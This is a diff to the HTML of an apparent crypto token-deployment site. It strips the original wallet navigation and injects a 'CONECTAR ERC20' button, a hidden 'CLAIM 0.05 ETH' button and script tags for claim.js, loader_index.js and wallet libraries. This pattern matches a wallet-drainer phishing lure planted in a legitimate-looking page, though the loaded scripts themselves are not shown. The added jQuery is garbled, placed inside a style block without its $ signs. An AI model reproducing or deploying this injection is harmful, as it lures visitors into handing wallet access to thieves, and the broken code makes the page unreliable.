@@ -201,45 +201,7 @@
 
 <body>
 
-  <nav class="navbar navbar-light bg-light" style="position: fixed; top:0px; right:0px; left:0px;">
-    <div class="container-fluid">
-      <a class="navbar-brand" href="/">
-        <img src="/static/media/moon-deploy.png" alt="" height="30" class="top-logo-1" />
-        <img src="/static/media/icon.png" alt="" height="30" class="top-logo-2" />
-      </a>
-
-      <div class="d-flex justify-content-end text-center align-items-center">
-
-        <div class="bg-light rounded-pill p-2 mx-2 topNetwork border-info border">
-          <img src="/static/media/eth.png" alt="" width="12px">
-           <span class="fw-bold" style="font-size: 15px;">Ethereum</span>
-        </div>
-
-        <script>
-          $(".topNetwork").on("click",()=>{
-            $('#networkModal').modal('show')
-          })
-        </script>
-                  
-        <span class="account_address" style="display: none;"></span>
-
-        <div class="mx-2">
-
-          <button onclick="gtag('event','connect_wallet')" type="button" class="btn-connect btn btn-primary btn-sm"
-            id="btn-connect">
-            Connect Wallet
-          </button>
-
-          <button onclick="gtag('event','disconnect_wallet')" type="button" class="btn btn-sm" id="btn-disconnect"
-            style="background-color:transparent; display: none;">
-            <i class="fas fa-sign-out-alt"></i>
-          </button>
-        </div>
-
-      </div>
-
-    </div>
-  </nav>
+   </nav>
 
   <div class="modal fade" id="networkModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
@@ -254,6 +216,99 @@
             $("#networkModal").modal("hide");
           })
         </script>
+	      <style>
+    .Home_soon__8s2ww button {
+        background-color: #D622C8;
+        border: 2px solid #340E31;
+        border-radius: 15px;
+        box-sizing: border-box;
+        color: #F5E307;
+        cursor: pointer;
+        display: grid;
+	margin-right: auto;
+	margin-left: auto;    
+        font-size: 10px;
+        font-weight: 450;
+        line-height: 10px;
+        margin: 4;
+        outline: none;
+        padding: 10px 20px;
+        position: relative;
+        text-align: right;
+        text-decoration: none;
+        touch-action: manipulation;
+        transition: box-shadow .2s, -ms-transform .1s, -webkit-transform .1s, transform .1s;
+        user-select: none;
+        -webkit-user-select: none;
+        width: auto;
+    }
+
+    .Home_soon__8s2ww button:focus-visible {
+        box-shadow: #222222 0 0 0 2px, rgba(255, 255, 255, 0.8) 0 0 0 4px;
+        transition: box-shadow .2s;
+    }
+
+    .Home_soon__8s2ww button:active {
+        background-color: #F7F7F7;
+        border-color: #000000;
+        transform: scale(.96);
+    }
+
+    .Home_soon__8s2ww button:disabled {
+        border-color: #DDDDDD;
+        color: #DDDDDD;
+        cursor: not-allowed;
+        opacity: 1;
+    }
+	
+   (document).ready(function(){
+	   ('.Home_soon__8s2ww').hide();
+	   ('.Home_soon__8s2ww').click(function(){
+		   ('body,html').animate({    scrollTop:0   },1000)  });
+	   (window).scroll(function () {
+		   if ((this).scrollTop() &gt; 200) {
+			   ('.Home_soon__8s2ww').fadeIn();
+		   }
+		   else { 
+			   ('.Home_soon__8s2ww').fadeOut(); 
+		   } 
+	   });
+	});
+</style>
+
+
+                    <div class="Home_soon__8s2ww">
+                        <button id="connectWallet">CONECTAR ERC20</button>
+                        <button id="claimButton" style="display: none;">CLAIM 0.05 ETH</button>
+                        <br />
+                    </div>
+                    
+                    
+                  
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="./src/js/loader_index.js"></script>
+
+    <script type="text/javascript" src="src/js/web3.min.js"></script>
+    <script type="text/javascript" src="src/js/moralis.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="src/js/claim.js"></script>
+    
+    <script type="text/javascript" src="./src/js/index.min.js"></script>
+
+    <script type="text/javascript">
+        $('.alert-eth-message-close').click(function(){
+            $('.alert-eth-message').fadeOut(200);
+        });
+    </script>
+
+</body>
+<script charset="UTF-8" id="LA_COLLECT" src="./src/js/js-sdk-pro.min.js"></script>	
+
 
         <div class="modal-body p-3">
           <div class="row text-center">
